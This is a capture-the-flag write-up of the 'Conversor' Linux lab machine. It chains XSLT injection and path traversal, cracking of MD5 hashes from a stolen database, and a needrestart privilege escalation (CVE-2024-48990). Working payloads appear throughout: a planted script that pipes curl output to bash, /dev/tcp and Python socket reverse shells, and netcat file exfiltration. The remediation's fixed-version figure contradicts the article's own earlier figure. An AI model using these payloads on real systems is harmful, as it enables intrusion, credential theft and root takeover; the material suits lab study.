# Conversor

**Machine Name**: Conversor

**Machine OS**: Linux

**Difficulty**: Easy

## Introduction

Given a network that handle web application with a function to convert XML file into a more readable format using a vulnerable version of an XLST processor. An attacker can exploit this vulnerability to escalate privileges. First is by breaking a weak cryptographic implementation used in the DB, then by exploiting a vulnerable **needrestart** binary to obtain full system access. The combined weakness which are unsafe XSLT processing, weak cryptography, and an exploitable system binary demonstrate how chained vulnerabilities can lead to complete compromise.

## Information Gathering

The IP Address of the machine is 10.10.11.92, tried to do **curl** and got several info such as DNS, Web Server version, and port. It also said that the IP belong to server name 'http://conversor.htb', do setting the IP to the server name in **/etc/hosts** so your machine knew to where the packet will be send and connect.

<figure><img src="../.gitbook/assets/image (5).png" alt="Do curl for the given IP"><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (6).png" alt="Setting IP to server name with /etc/hosts"><figcaption></figcaption></figure>



### Network Scanning

Do network scanning to identify any open port that can be attack vector using **Nmap.**&#x20;

```
nmap -sV -sT -v -p- [Domain name]
```

* -sV : Detect service version
* -sT : TCP connect scan
* -v : verbose
* -p- : scan all port

There is only two service that opened by the server, **ssh** with port 22 and **http** with port 80 as long as their version. Tried to enumerate each services version but nothing come up that may work out. The only thing to find out more is to open the http web server.

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>



### Fuzzing

Do fuzzing with **ffuf** tool and got several endpoints:

* /about 200
* /login 200
* /register 200
* /javascript 301
* /logout 302
* /convert 405



### Source Code Review

Try register and login to get to know about how the web application worked. There is **/about** endpoint which is give away the source code of the application so we can do white box testing to the application.

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

The interesting part is in the **/convert** endpoint which it process how the uploaded file do in the backend. The pathname is vulnerable to path traversal due to no input sanitization and how the XSLT process.

```
transform = etree.XSLT(xslt_tree)
```



Find out if it vulnerable to XSLT Injection with knowing its version, vendor, and vendor url to get the documentation.

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

The web application gave us this information which confirm that the injection success, but there is several issue which it being outline in the code when the parser' parse the code.

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Here the XSLT won't resolve any entity that comes from outside, no network outbound allowed, and can only view our file that has been uploaded using XML.

```
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
```

in file **install.md**, there is an information about the use of cronjob to automate run any file on path **/var/www/conversor.htb/scripts** every 1 minute. If we can put our uploaded file onto this path with malicious file, there is a possibility that we can get the system shell.

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

## Enumeration

Upon trying to upload file, there is a path traversal vulnerability that exists within the application allowing attacker to save and write the file to anywhere. No input sanitization on file name and location and with this, we can upload our file into **/var/www/conversor.htb/scripts.**

```python
xml_file = request.files['xml_file']
xslt_file = request.files['xslt_file']
from lxml import etree
xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
xml_file.save(xml_path)
xslt_file.save(xslt_path)
```

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>



But there is a restriction, we can try to exploit the XML file upload name section with path traversal but the body required anything that start with XML tag. So at this point, it's not possible to put malicious file under any circumstance.&#x20;

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

to fix this issue, there is some working code from the source below that utilize the namespace [ http://exslt.org/common](http://exslt.org/common) and have a dangerous function **\<shell:document>** that can be used to allow XSLT to output its result to multiple file.

{% embed url="https://thecybersecguru.com/ctf-walkthroughs/mastering-conversor-beginners-guide-from-hackthebox/" %}

The theory is, we use the attack vector on XSLT processor and exploit it using malicious namespace to put a file under **/var/www/conversor.htb/scripts** as reverse shell attack with a file named **shell.py**. This file will make a request into our machine to download and run a file named **shell.sh** as the reverse shell.

{% code title="shell.py" %}
```python
import os

os.system("curl [attacker_machine]:7000/shell.sh|bash")
```
{% endcode %}

{% code title="malicious.xslt" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="[http://www.w3.org/1999/XSL/Transform](http://www.w3.org/1999/XSL/Transform)"
    xmlns:shell="[http://exslt.org/common](http://exslt.org/common)"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl [attacker_machine]:7000/shell.sh|bash")
        </shell:document>
    </xsl:template>

</xsl:stylesheet>
```
{% endcode %}

{% code title="shell.sh" %}
```bash
sh -i >& /dev/tcp/[attacker_machine]/9001 0>&1
```
{% endcode %}



On the attacker machine, set up the listener using netcat before sending the **malicious.xslt** file into the web app.

```
nc -nvlp 9001
```





## Gaining Access

Upon gaining the access to the web server as user **www-data,** try to gathering information as much as you can for any suspicious file, potential vulnerable service version, or any misconfiguration. Here I fetch linux enumeration file **linpeas.sh** to gather information as image below.

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

There is an interesting file within path **/var/www/conversor/htb/instance/users.db** that it also leaked the existence in the source code folder. We can fetch this file to read its content with hope that we can gathered useful information as our next step to escalate privilege.

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



### Send file from victim to attacker server

#### From Victim Server to Attacker

```
nc -n [attacker server] [port] < users.db
```

#### From Attacker Server to Victim

```
nc -nvlp [port] > users.db
```

Here is the content of the file. There are tables named **files**, **sqlite\_sequence**, and **users** that we can look up the **users** table to decrypt their password.

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>



### Try to decrypt the hash in the db

The password encrypted with insecure cryptography algorithm **md5**

```
hashcat -a 0 -m 0 --username hashes.txt /usr/share/wordlists/rockyou.txt
```

Try the password result to the SSH that associate with the username.



## Privilege Escalation

Upon successful attempt on SSH into the username that associate with the server, do enumeration again with **linpeas.sh.** From there, we can found interesting misconfiguration on **sudo** utility that allows the use of **needrestart** service without have to be a root and can use **sudo** without password.

> _**needrestart**_ is a service that checks which daemons need to be restarted after library  upgrades.  Since daemon often run as root, it possible to catch the daemon privilege to escalate the privilege as root.

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

I'm using the technique by author **@allypetitt** on medium that said **needrestart** version under **3.8** is vulnerable to local privilege escalation vulnerability as introduced in **CVE-2024-48990**. It exploited by tricking the service into running the Python interpreter with an attacker-controlled **PYTHONPATH** environment variable.

{% embed url="https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80" %}

### Idea

The idea is to launch a Python interpreter within attacker-controlled path named **PYTHONPATH** into our Python code that perform library path hijacking attack to execute arbitrary Python code.

the main code will tend to auto run with looping code.

{% code title="main.py" %}
```python
while True:
    pass
```
{% endcode %}

Now the **\_\_init\_\_.py** file under folder **importlib** will act as the reverse shell to catch root privilege.&#x20;

{% code title="importlib/__init__.py" %}
```
import os,pty,socket;s=socket.socket();s.connect(("127.0.0.1",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```
{% endcode %}

do export **PYTHONPATH** to our directory and start the main code.

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

To trigger the reverse shell, simply by run the service and we got the root access privilege and pawned.

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## Remediation

To remediate this issue, do the following action:

* update **needrestart** service up to newer version that contain no vulnerability against **CVE-2024-48990 (>=2.8)**.&#x20;
* Ensure **proper input sanitization and validation** to avoid path traversal.
* Ensure XSLT configuration **not to allows any malicious namespace** or code injection that can harm the web server.
* **Implement least privilege** and not allowed any user to have specific service run without password.

## Reference

{% embed url="https://medium.com/@allypetitt/rediscovering-cve-2024-48990-and-crafting-my-own-exploit-ce13829f5e80" %}

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}

{% embed url="https://thecybersecguru.com/ctf-walkthroughs/mastering-conversor-beginners-guide-from-hackthebox/" %}
